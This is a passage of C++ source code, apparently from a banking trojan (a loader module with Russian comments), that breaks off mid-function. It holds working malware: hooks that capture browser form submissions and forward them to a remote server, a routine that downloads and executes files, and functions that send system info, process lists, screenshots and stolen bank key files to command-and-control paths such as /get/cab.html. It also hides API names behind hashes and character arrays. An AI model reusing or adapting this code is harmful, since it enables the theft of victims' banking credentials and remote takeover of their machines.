#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include "shlobj.h"

#include "Loader.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Crypt.h"
#include "BotUtils.h"
#include "Inject.h"
#include "BotClasses.h"
#include "BotHTTP.h"
#include "Config.h"
#include "Task.h"
#include "Utils.h"

#include "Modules.h"


//#include "BotDebug.h"

namespace LDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define LDBG LDBGTEMPLATES::DBGOutMessage<>


typedef struct TSendDataHandler
{
	PCHAR HandleURL;       // Адрес который необходимо обработать
	PCHAR URL; 			   // Рабочий адрес
	PSendDataEvent Event;  // Событие обработки
	THandleDataMode Mode;  // Режим обработки
} *PSendDataHandler;


bool bSBStarted;

// Список зарегистрированных обработчиков отправки данных
HANDLE SendHandlersTID = NULL;  //  Инициализауию глобальных данных буднм
				        	   //  привязывать к идентификатору потока
PList SendDataHandlers = NULL;


void DestroyDataHandler(LPVOID Data)
{
	// Уничтожить данные
	PSendDataHandler H =  (PSendDataHandler)Data;
	STR::Free(H->HandleURL);
	STR::Free(H->URL);
	FreeStruct(Data);
}


 void InitializeHandlersList()
{
	// Инициализацию списка перехватчиков производим в случее еслт
	// он не создал либо создан в другом процессе
	HANDLE TID = pGetCurrentThreadId();

	if (SendDataHandlers == NULL || SendHandlersTID != TID)
	{
		SendDataHandlers = List::Create();
		List::SetFreeItemMehod(SendDataHandlers, DestroyDataHandler);
		SendHandlersTID = TID;
	}
}


DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL)
{
	// Зарегистрировать обработчик отправки
	if (Event == NULL && Mode == hdmUnknown)
		return 0;

	InitializeHandlersList();
	
	PSendDataHandler Handler = CreateStruct(TSendDataHandler);
	if (Handler == NULL)
		return 0;

	Handler->HandleURL = STR::New(HandleURL);
	Handler->URL = STR::New(SendURL);
	Handler->Event = Event;
	Handler->Mode = Mode;

	List::Add(SendDataHandlers, Handler);

	return (DWORD)Handler;
}


void CallSendDataHandlers(PSendHTMLData Data, bool &Cancel)
{

	if (SendDataHandlers == NULL)
		return;


	// Вызвать обработчики отправки данных
	DWORD Count = List::Count(SendDataHandlers);
	PSendDataHandler Handler;

	bool IgnoreHandler;

	for (DWORD i = 0; i < Count; i++)
	{
		// Получаем новый обработчик
		Handler = (PSendDataHandler)List::GetItem(SendDataHandlers, i);

		// Проверяем адрес
		DWORD Tm;
		if (Handler->HandleURL != NULL && !WildCmp(Data->URL, Handler->HandleURL, &Tm, &Tm, &Tm))
			continue;

		// Вызываем событие
		IgnoreHandler = false;
		if (Handler->Event != NULL)
		{
			Handler->Event(Data, IgnoreHandler, Cancel);
			if (Cancel)
				return;
		}
		if (IgnoreHandler)
			continue;

		// Обрабатываем режим
		if (Handler->Mode != hdmUnknown && Handler->URL != NULL)
		{
			// Отправляем данные на сервер
			DataGrabber::SendHTMLDataToServer(Handler->URL, Data, NULL);
			if (Handler->Mode == hdmRedirect)
			{
				Cancel = true;
				return;
			}
        }
	}
}



bool GetSBStarted()
{
	return bSBStarted;
}
void SetSBStarted(bool bStartHideJava_SB)
{
	bSBStarted=bStartHideJava_SB;
}


bool ParseUrl( char *Url, char **Server, char **Path, int *Port )
{
	char *Ptr1 = NULL;
	char *Ptr2 = NULL;
	char *Ptr3 = NULL;
	char *Ptr4 = NULL;

	char *Host		   = (char*)MemAlloc( 512 );
	char *OptionalPort = (char*)MemAlloc( 512 );

	if ( Host == NULL ||
		 OptionalPort == NULL )
	{
		return false;
	}

	DWORD dwPort = 0;

	Ptr1 = m_strstr( Url, "://" );

	if( Ptr1 )
	{
		Ptr1 += 3;
	}
	else
	{
		Ptr1 = Url;
	}

    Ptr4 = m_strstr( Ptr1, "/" );
	Ptr2 = m_strstr( Ptr1, ":" );

	if( !Ptr2 )
	{
		*Port = 80;
		Ptr3   = m_strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		m_memcpy( Host, Ptr1, Ptr3 - Ptr1 );
		Host[ Ptr3 - Ptr1 ] = '\0';
	}
	else
	{
		Ptr3 = m_strstr( Ptr1, "/" );

		if( !Ptr3 )
		{
			return false;
		}

		m_memcpy( OptionalPort, Ptr2 + 1, Ptr3 - Ptr2 );
		m_memcpy( Host, Ptr1, Ptr2 - Ptr1 );

		OptionalPort[ Ptr3 - Ptr2 ] = '\0';
		Host[ Ptr2 - Ptr1 ]			= '\0';

		*Port = m_atoi( OptionalPort );
	}

	MemFree( OptionalPort );

	*Server = Host;
	*Path   = Ptr4;

	return true;
}

struct ConnectionData
{
	SOCKET Socket;
	sockaddr_in SockAddr;
};
DWORD ConnectThread(LPVOID lpParameter)
{
	ConnectionData* connData = (ConnectionData*)lpParameter;
	
	if ( (int)pconnect( connData->Socket, (const struct sockaddr*)&connData->SockAddr, sizeof( connData->SockAddr ) ) == SOCKET_ERROR )
	{
		//OutputDebugStringA("connect ERROR");
		DWORD err = (DWORD)pGetLastError();
		pclosesocket(connData->Socket);
		pExitThread(-1);
	}
	/*else
		OutputDebugStringA("connect SUCCESS");*/

	pExitThread(0);
	return 0;
}

SOCKET MyConnect( char *Host, int Port )
{
	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname( (const char*)Host );

	if ( lpHost == NULL )
	{
		return -1;
	}


	sockaddr_in SockAddr;

	SockAddr.sin_family		 = AF_INET;
	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
	SockAddr.sin_port		 = (USHORT)phtons( (unsigned short)Port );

	ConnectionData connData;
	connData.SockAddr = SockAddr;
	for(int i=0; i<3; i++) {
		SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );
		
		if( Socket == -1 )
			return -1;
		connData.Socket = Socket;

		//OutputDebugStringA("Connection...");
		HANDLE ConnectThreadHandle = (HANDLE)pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ConnectThread, &connData, NULL, 0);
		if((long)pWaitForSingleObject(ConnectThreadHandle, 10000) == WAIT_TIMEOUT)
		{
			if((int)pshutdown(Socket, 2) == SOCKET_ERROR)
			{
				//wsprintfA(&str[0], "WSA_Err:%d", WSAGetLastError());
				//OutputDebugStringA(&str[0]);
			}
			pTerminateThread(ConnectThreadHandle, 1);
			//pOutputDebugStringA("Connection timeout (> 10 sec)");
		}
		DWORD exitCode = 0;
		BOOL res = (BOOL)pGetExitCodeThread(ConnectThreadHandle, &exitCode);

		//wsprintfA(&str[0], "EC:%d", exitCode);
		//OutputDebugStringA(&str[0]);

		if(res && exitCode == 0)
			return Socket;
	}


	return -1;
}


bool MySend( SOCKET Socket, const char *Data, int DataLen )
{
	if ( (int)psend( Socket, Data, DataLen, 0 ) == SOCKET_ERROR )
	{
		return false;
	}

	return true;
}


typedef struct
{
	HINTERNET hInstance;
	HINTERNET hConnect;
	HINTERNET hRequest;

	HANDLE hConnectedEvent;
	HANDLE hRequestOpenedEvent;
	HANDLE hRequestCompleteEvent;

	DWORD dwCurrent;

	bool IsDownloaded;
} ASYNCHTTP, *PASYNCHTTP;

void __stdcall Callback( HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpStatusInfo, DWORD dwStatusInfoLen )
{
	PASYNCHTTP pData = (PASYNCHTTP)dwContext;

	if ( pData )
	{
		switch( pData->dwCurrent )
		{
			case 1:

				if ( dwInternetStatus == INTERNET_STATUS_HANDLE_CREATED )
				{
					INTERNET_ASYNC_RESULT *pRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;

					pData->hConnect = (HINTERNET)pRes->dwResult;
					pSetEvent( pData->hConnectedEvent );
				}
			break;

			case 2:

				switch(dwInternetStatus)
				{
					case INTERNET_STATUS_HANDLE_CREATED:

					{
						INTERNET_ASYNC_RESULT *pRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;

						pData->hRequest = (HINTERNET)pRes->dwResult;

						pSetEvent( pData->hRequestOpenedEvent );
					}

					break;

					case INTERNET_STATUS_REQUEST_SENT:

					{
						DWORD *lpBytesSent = (DWORD*)lpStatusInfo;
					}

					break;
					
					case INTERNET_STATUS_REQUEST_COMPLETE:
					{
						INTERNET_ASYNC_RESULT *pAsyncRes = (INTERNET_ASYNC_RESULT *)lpStatusInfo;
						pSetEvent( pData->hRequestCompleteEvent );
					}
					break;

					case INTERNET_STATUS_RECEIVING_RESPONSE:
					break;


					case INTERNET_STATUS_RESPONSE_RECEIVED:
					{
						DWORD *dwBytesReceived = (DWORD*)lpStatusInfo;

						if ( !*dwBytesReceived )
						{
							pData->IsDownloaded = true;
						}						
					}
				}

			break;

			default:
			break;

		}
	}

	return;
}


char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved )
{
	DWORD dwLen = 0;

	char *Buffer = NULL;

	int Bytes = 0;

	char *TempBuffer = (char*)MemAlloc( 1024 );

	if ( TempBuffer == NULL )
	{
		return NULL;
	}

	while ( ( Bytes = (int)precv( Socket, TempBuffer, 1024, 0 ) ) != 0 )
	{
		if ( Bytes == -1 )
		{
			break;
		}

		if ( Buffer == NULL )
		{
			Buffer = (char*)MemAlloc( Bytes + 1 );

			if ( Buffer == NULL )
			{
				return NULL;
			}
		}
		else
		{
			char *p = (char*)MemRealloc( Buffer, dwLen + Bytes + 1 );
						
			if ( p == NULL )
			{
				return NULL;
			}

			Buffer = p;
		}

		m_memcpy( Buffer + dwLen, TempBuffer, Bytes );
		dwLen += Bytes;
	}

	MemFree( TempBuffer );

	if ( dwLen > 0 )
	{
		DWORD Offset = 0;

		for ( DWORD i = 0; i < dwLen; i++ )
		{
			if ( Buffer[i]     == '\r' && Buffer[i + 1] == '\n' &&
				 Buffer[i + 2] == '\r' && Buffer[i + 3] == '\n' )
			{
				Offset = i + 4;
				break;
			}
		}

		if ( Offset > 0 )
		{
			Buffer += Offset;
			dwLen  -= Offset;

			*dwRecved = dwLen;

			return Buffer;
		}
	}

	MemFree( Buffer );
	
	return NULL;
}



bool AsyncDownload1( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	char *Host = NULL;
	char *Path = NULL;
	int   Port = 80;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	SOCKET Socket = MyConnect( Host, Port );

	if( Socket == -1 )
	{
		return false;
	}

	char *UserAgent = NULL;
	UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *query=(char*)MemAlloc(2048);

	m_lstrcpy(query,"GET /");
	m_lstrcat(query,Path);
	m_lstrcat(query," HTTP/1.1\r\nAccept: */* \r\n ");
	m_lstrcat(query,"Accept-Language: ru \r\n");
	m_lstrcat(query,"UA-CPU: x86 \r\n");
	m_lstrcat(query,"Accept-Encoding: gzip, deflate \r\n");
	m_lstrcat(query,"User-Agent: ");
	m_lstrcat(query,UserAgent);
	m_lstrcat(query,"\r\nHost: ");
	m_lstrcat(query,Host);
	m_lstrcat(query,"\r\nConnection: Close\r\n\r\n\r\n");



	bool b = MySend( Socket, (const char *)query, m_lstrlen( query ) );


	MemFree( Host );
	//MemFree( Path );
	MemFree( UserAgent );
	MemFree( query );
	if ( !b )
	{
		return false;
	}

	DWORD dwSizeFile = 0;

	char *Buffer = RecvAndParse( Socket, &dwSizeFile );

	if ( !Buffer )
	{
		pclosesocket( Socket );
		return false;
	}

	if ( dwSize )
	{
		*lpBuffer  = (LPBYTE)Buffer;
		*dwSize    = dwSizeFile;

		return true;
	}

	return false;
}






bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  )
{
	LPBYTE lpMemory;
	DWORD  dwMemorySize;

	bool ret = AsyncDownload1( Url, &lpMemory, &dwMemorySize );

	if ( ret )
	{
		if ( dwFile == 1 && FileName )
		{
			File::WriteBufferW( FileName, lpMemory, dwMemorySize );
			MemFree( lpMemory );
		}
		else
		{
			*lpMem		= lpMemory;
			*dwMemSize	= dwMemorySize;
		}
	}
	

	return ret;
}

bool DownloadInFile( char *Url, WCHAR *FileName )
{
	return DownloadInternet(Url, FileName, 1, NULL, NULL );
}

bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize )
{
	return DownloadInternet( Url, NULL, 0, lpMem, dwSize );
}


bool ExecuteFile( char *Url, WCHAR *FileName )
{
	DWORD dwSize = 0;

	bool Dwl = DownloadInFile( Url, FileName );

	if ( Dwl && pGetFileAttributesW( FileName ) )
	{
		if ( RunFile( FileName ) )
		{
			return true;
		}
	}

	return false;
}








//----------------------------------------------------------------------------

bool CheckValidPostResult(PHTTPResponse Response, PCHAR HTMLDocument)
{
	// Функция проверяет ответ сервера и возвращает истину если сервер успешно
	// принял отправленные данные

	// В данный момент сервер сигнализирует об успешном приёме данных
	// отправкой ответа с кодом 403
	return Response->Code == 403;
}

//-----------------------------------------------------------------------------
/*
bool PluginIsExecutableFile(LPVOID Buf)
{
	// Функция возвращает истину если буффер является заголовком
	// exe файла
	if (Buf == NULL) return false;


	WORD Nomber = PIMAGE_DOS_HEADER(Buf)->e_magic;

	return (Nomber == IMAGE_DOS_SIGNATURE) ||
		   (Nomber == IMAGE_NT_SIGNATURE);

}

LPVOID DownloadPlugin(PCHAR URL, DWORD *ModuleSize)
{
	// Функция загружает плагин (DLL)

    // Зсгружаем файл
	PCHAR Buf = NULL;
	bool Ready = false;
	#ifdef CryptHTTPH
		const static char Ext[] = {'.', 'p', 's', 'd', 0};
		PCHAR CryptURL = File::ChangeFileExt(URL, (PCHAR)Ext);
		PCHAR Pass = GetMainPassword();

		Ready = CryptHTTP::Get(CryptURL, Pass, &Buf, NULL);

		STR::Free(CryptURL);
		STR::Free(Pass);
	#else
		Ready = HTTP::Get(URL, &Buf, NULL);
	#endif

	if (!Ready)
		return NULL;

	// Расшифровываем XOR алгоритмом
	const static char Signature[] = {'B', 'J', 'B', 0};
	DWORD Size = STR::Length(Buf);
	LPBYTE Body = XORCrypt::DecodeBuffer((PCHAR)Signature, Buf, Size);

	if (Body == NULL)
	{
		// Нулевой указатель означает, что модуль не был зашифрован
		// XOR криптованием
		Body = (LPBYTE)Buf;
		DWORD Size = STR::Length(Buf);
	}

	// Создаём чистый модуль
	LPVOID Module = NULL;
	if (Body != NULL && Size > 0 && PluginIsExecutableFile(Body))
	{
		Module = MemAlloc(Size);
 		if (Module != NULL)
		{
			m_memcpy(Module, Body, Size);
			if (ModuleSize != NULL)
				*ModuleSize = Size;
        }
	}

	//
	STR::Free(Buf);

	return Module;
}



//----------------------------------------------------------------------------

LPVOID DownloadPluginFromPath(PCHAR Path, DWORD *ModuleSize)
{
	// Функция загружает с сервера плагин (DLL)
	//	Path - относительный путь к плагину. Должен начинаться с
	//        обратного слеша /
	if (STR::IsEmpty(Path)) return NULL;


	PCHAR URL = GetBotScriptURL(0, Path);

	LPVOID Module = DownloadPlugin(URL, ModuleSize);

	STR::Free(URL);

	return Module;
}
//----------------------------------------------------------------------------

LPVOID DownloadPluginEx(PCHAR PluginPath, DWORD ScriptID, DWORD MaxTime, DWORD *ModuleSize)
{
	// Функция расши ренной загрузки плагина
	if (ModuleSize != NULL)
		*ModuleSize = 0;

	if (STR::IsEmpty(PluginPath) && ScriptID == 0)	return NULL;

	LPVOID Module = NULL;
	DWORD StartTime = 0;
	if (MaxTime != INFINITE && MaxTime != 0)
        StartTime = (DWORD)pGetTickCount();

	// Запускаем цикл загрузки плагина
	do
	{
		// Пытаемся загрузить плагин
		// Адрес плагина пошлучаем при каждой попытке загрузки
		PCHAR URL = GetBotScriptURL(ScriptID, PluginPath);

		if (URL != NULL)
		{
			Module = DownloadPlugin(URL, ModuleSize);
			STR::Free(URL);
		}

		// В случае провала приостанавливаем поток
		if (Module == NULL && MaxTime > 0)
		{

			if (MaxTime != INFINITE && (((DWORD)pGetTickCount() - StartTime) >= MaxTime))
				break;

            pSleep(60000);
        }
	}
	while (Module == NULL && MaxTime != 0);

	return Module;
}
*/

//----------------------------------------------------------------------------

bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize)
{
	pOutputDebugStringA("SendGrabberReport");
	if (STR::IsEmpty(URL) || Buf == NULL || BufSize == 0)
		return false;

	// Собираем  данные сниффера

	PCHAR BotID = GenerateBotID();

	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", BotID);
	AddURLParam(Fields, "base", Buf, BufSize);
    STR::Free(BotID);

	THTTPResponse Response;
    ClearStruct(Response);

	#ifdef CryptHTTPH
        PCHAR Password = GetMainPassword();
		bool Result =  CryptHTTP::Post(URL, Password, Fields, NULL, &Response);
		STR::Free(Password);
	#else
		bool Result =  HTTP::Post(URL, Fields, NULL, &Response);
	#endif
	Strings::Free(Fields);

	Result = Result && CheckValidPostResult(&Response, NULL);
	HTTPResponse::Clear(&Response);

	return Result;
}

//----------------------------------------------------------------------------

bool SendFirstInfo()
{
pOutputDebugStringA("SendFirstInfo");
	// Функция отправляет информацию о системе
	PCHAR Script = GetBotScriptURL(SCRIPT_FIRST_INFO);

	PCHAR OSInfo   = GetOSInfo();
	PCHAR ProcList = GetProcessList();
	PCHAR ID = GenerateBotID();

    // Формируем POST данные
	PStrings Fields = Strings::Create();

	AddURLParam(Fields, "id", ID);
	AddURLParam(Fields, "os", OSInfo);
	AddURLParam(Fields, "plist", ProcList);


	MemFree(OSInfo);
	MemFree(ProcList);
	STR::Free(ID);

	// Лтправляем запрос
	#ifdef CryptHTTPH
		PCHAR Password = GetMainPassword();
		bool Result = CryptHTTP::Post(Script, Password, Fields, NULL, NULL);;
		STR::Free(Password);
	#else
		bool Result = HTTP::Post(Script, Fields, NULL, NULL);
	#endif

	Strings::Free(Fields);
	STR::Free(Script);

	return Result;
}



bool SendTradeInfo( char *Buffer )
{
	PCHAR Serv = GetActiveHost();
	
	if ( Serv == NULL )
	{
		return 0;
	}

	char Host[30];
	m_lstrcpy( Host, Serv );

	STR::Free(Serv);

	char Script[]  = {'/','g','e','t','/','t','r','a','.','h','t','m','l',0};
	char Args[]	   = "id=%s&data=%s";

	char Request[] = "POST %s HTTP/1.1\r\n"
					 "Host: %s\r\n"
					 "User-Agent: %s\r\n"
					 "Accept: text/html\r\n"
					 "Connection: Close\r\n"
					 "Content-Type: application/x-www-form-urlencoded\r\n"
					 "Content-Length: %d\r\n\r\n";

	char Uid[100];
	GenerateUid( Uid );

	char *Data	   = URLEncode( Buffer );
	char *PartReq  = (char*)MemAlloc( 1024 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	if ( PartReq == NULL )
	{
		return false;
	}
	
	_pwsprintfA( PartReq, Args, Uid, Data );

	
	char *Header = (char*)MemAlloc( 1024 );

	if ( Header == NULL )
	{
		MemFree( PartReq );
		return false;
	}


	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	_pwsprintfA( Header, Request, Script, Host, UserAgent, m_lstrlen( PartReq ) );

	MemFree( UserAgent );
	
	char *SendBuffer = (char*)MemAlloc( m_lstrlen( PartReq ) + m_lstrlen( Header ) + 1 + 2 );

	if ( SendBuffer == NULL )
	{
		MemFree( PartReq );
		MemFree( Header );
		return false;
	}

	m_lstrcpy( SendBuffer, Header );
	m_lstrcat( SendBuffer, PartReq );
	m_lstrcat( SendBuffer, "\r\n" );

	MemFree( Header  );
	MemFree( PartReq );

	SOCKET Socket = MyConnect( Host, 80 );

	bool Ret = MySend( Socket, (const char *)SendBuffer, m_lstrlen( SendBuffer ) );

	pclosesocket( Socket );

	MemFree( SendBuffer );

	return  Ret;
}



char *GetInfoFromBcServer( char *Url )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	char *Host = NULL;
	char *Path = NULL;
	int   Port = 0;

	if ( !ParseUrl( Url, &Host, &Path, &Port ) )
	{
		return false;
	}

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	char Request[] = "GET %s HTTP/1.0\r\n"
					 "Host: %s\r\n"
					 "User-Agent: %s\r\n"
					 "Connection: close\r\n\r\n";


	char *HttpPacket = (char*)MemAlloc( 1024 );

	if ( HttpPacket == NULL )
	{
		return false;
	}

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	_pwsprintfA( HttpPacket, Request, Path, Host, UserAgent );

	SOCKET Socket = MyConnect( Host, Port );

	if ( Socket == INVALID_SOCKET )
	{
		MemFree( HttpPacket );
		return NULL;
	}

	bool b = MySend( Socket, (const char *)HttpPacket, m_lstrlen( HttpPacket ) );

	MemFree( HttpPacket );

	if ( !b )
	{
		return NULL;
	}

	DWORD dwSize = 0;

	char *Buffer = RecvAndParse( Socket, &dwSize );

	pclosesocket( Socket );

	return Buffer;
}


bool SendScreen( LPVOID lpFile, DWORD dwFileSize )
{
	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return false;
	}

	PCHAR CheckHost = GetActiveHost();

	if ( !CheckHost )
	{
		return false;
	}

	char Host[30];
	m_lstrcpy( Host, CheckHost );

	STR::Free(CheckHost);

	char HeaderTemplate[] = "POST /get/scr.html HTTP/1.0\r\n"
							"Host: %s\r\n"
							"User-Agent: %s\r\n"
							"Connection: close\r\n"
							"Content-Length: %d\r\n"
							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";

	char *Boundary = (char*)MemAlloc( 100 );

	if ( Boundary == NULL )
	{
		MemFree( lpFile );
		return false;
	}

	DWORD dwBoundary = (DWORD)pGetTickCount();
	char *Boundary_1 = (char*)MemAlloc( 100 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	_pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );

	char Uid[100];
	GenerateUid( Uid );

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );

	//id
	_pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );

	//file
	_pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"screen\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );

	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );

	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );

	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len + dwFileSize + m_lstrlen( Boundary_1 ) + 2;

	char *Header = (char*)MemAlloc( 1024 );
	_pwsprintfA( Header, HeaderTemplate, Host, UserAgent, dwContentLen, dwBoundary );

	bool ret = false;

	SOCKET Socket = MyConnect( Host, 80 );	

	if( Socket != -1 )
	{
		MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
		MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
		MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );
		MySend( Socket, "\r\n", 2 );
		MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
		MySend( Socket, "\r\n", 2 );

		ret = true;

		pclosesocket( Socket );
	}

	MemFree( Header );
	MemFree( SendBuffer_1 );
	MemFree( SendBuffer_2 );

	return ret;
}



DWORD WINAPI SendBSSInist( LPVOID lpData )
{
	if (lpData == NULL)
		return 0;

	#ifdef HunterH
		HANDLE tmp;
		tmp= (HANDLE)pCreateMutexA(NULL,false,"Hnt");
	#endif
	

	PBSSINIST pBank = (PBSSINIST)lpData;

	char *FilePath = pBank->FilePath;

	HANDLE hFile = pCreateFileA( FilePath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
	
	if ( hFile == INVALID_HANDLE_VALUE )
	{		
		return 0;
	}
	
	DWORD h;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );		

	LPBYTE lpFile = NULL;

	if ( dwFileSize > 0 )
	{
		HANDLE hMapFile = (HANDLE)pCreateFileMappingA( hFile, 0, PAGE_READONLY, 0, 0, 0 );

		if ( hMapFile != INVALID_HANDLE_VALUE )
		{
			LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

			if ( ( lpFile = (LPBYTE)MemAlloc( dwFileSize + 1 ) ) != NULL )
			{
				m_memcpy( lpFile, pbyFile, dwFileSize );
			}

			pUnmapViewOfFile( pbyFile );
		}

		pCloseHandle( hMapFile );
	}

	pCloseHandle( hFile );


	if ( !lpFile )
	{
		return 0;
	}

	char HeaderTemplate[] = "POST /get/cab.html HTTP/1.0\r\n"
							"Host: %s\r\n"
							"User-Agent: %s\r\n"
							"Connection: close\r\n"
							"Content-Length: %d\r\n"
							"Content-Type: multipart/form-data; boundary=---------------------------%d\r\n\r\n";

	char *Boundary = (char*)MemAlloc( 100 );

	if ( Boundary == NULL )
	{
		MemFree( lpFile );
		return false;
	}

	DWORD dwBoundary = (DWORD)pGetTickCount();
	char *Boundary_1 = (char*)MemAlloc( 100 );

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	_pwsprintfA( Boundary_1, "-----------------------------%d\r\n", dwBoundary  );

	char Uid[100];
	GenerateUid( Uid );

	char *UserAgent = (char*)MemAlloc( 1024 );
	DWORD dwUserSize = 1024;

	pObtainUserAgentString( 0, UserAgent, &dwUserSize );

	char *SendBuffer_1 = (char*)MemAlloc( 1024 );
	char *SendBuffer_2 = (char*)MemAlloc( 1024 + dwFileSize );
	char *SendBuffer_3 = (char*)MemAlloc( 1024 );

	//id
	_pwsprintfA( SendBuffer_1, "%sContent-Disposition: form-data; name=\"id\"\r\n\r\n%s\r\n", Boundary_1, Uid );

	//file
	_pwsprintfA( SendBuffer_2, "%sContent-Disposition: form-data; name=\"cab\"; filename=\"%d\"\r\nContent-Type: application/octet-stream\r\n\r\n", Boundary_1, (DWORD)pGetTickCount()  );

	//type
	_pwsprintfA( SendBuffer_3, "%sContent-Disposition: form-data; name=\"type\"\r\n\r\n%d\r\n", Boundary_1, pBank->dwType );
	
	DWORD dwBuffer2Len = m_lstrlen( SendBuffer_2 );

	m_memcpy( SendBuffer_2 + dwBuffer2Len, lpFile, dwFileSize );

	DWORD dwContentLen = m_lstrlen( SendBuffer_1 ) + dwBuffer2Len  + m_lstrlen( SendBuffer_3 ) + dwFileSize + m_lstrlen( Boundary_1 ) + 2;

	WSADATA wsa;

	if ( (int)pWSAStartup( MAKEWORD( 2, 2 ), &wsa ) != 0 )
	{
		return 0;
	}

	PCHAR Host = GetActiveHost();
	bool ret = false;
	char *Header = NULL;

	
	if ( Host )
	{
		char Server[100];
		m_lstrcpy( Server, Host );

		SOCKET Socket = MyConnect( Server, 80 );		
		if( Socket != -1 )
		{
			Header = (char*)MemAlloc( 1024 );
			_pwsprintfA( Header, HeaderTemplate, Server, UserAgent, dwContentLen, dwBoundary );

			MySend( Socket, (const char *)Header, m_lstrlen( Header ) );
			MySend( Socket, (const char *)SendBuffer_1, m_lstrlen( SendBuffer_1 ) );
			MySend( Socket, (const char *)SendBuffer_3, m_lstrlen( SendBuffer_3 ) );
			MySend( Socket, (const char *)SendBuffer_2, dwBuffer2Len + dwFileSize );	
			MySend( Socket, "\r\n", 2 );
			MySend( Socket, Boundary_1,   m_lstrlen( Boundary_1 ) );
			MySend( Socket, "\r\n", 2 );

			DWORD dw = 0;
			char * Buf = RecvAndParse( Socket, &dw );

			if ( !m_lstrncmp( Buf, "OK!", 3 ) )
			{			
				ret = true;
			}

			MemFree( Buf );
								
			pclosesocket( Socket );
		}
	}

    STR::Free(Host);

	MemFree( Header );
	MemFree( SendBuffer_1 );
	MemFree( SendBuffer_2 );
	MemFree( SendBuffer_3 );
	MemFree( lpFile );
	
	if ( !ret )
	{
		pSleep( 1000 * 5 );
		StartThread( SendBSSInist, lpData );
		return 0;
	}

	pDeleteFileA( FilePath );
	MemFree( FilePath );
	MemFree( pBank );


	return ret;
}
//#endif



//****************************************************************************
//  DataGrabber - Функции для работы с отправляемыми данными
//****************************************************************************


const DWORD GrabberFileSignature = 0xF345FA56;

const static char DataFileExt[] = {'.', 'x', 's', 'i', 0};
const static char KeyLogFileExt[] = {'.', 'k', 's', 'i', 0};

const static char DataFileMask[] = {'*', '.', 'x', 's', 'i', 0};
const static char KeyLogFileMask[] = {'*', '.', 'k', 's', 'i', 0};


namespace DataSender
{

	void ProcessDataFile(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
	{
		// Обрабатываем найденный файл
		PStrings Files = (PStrings)Data;
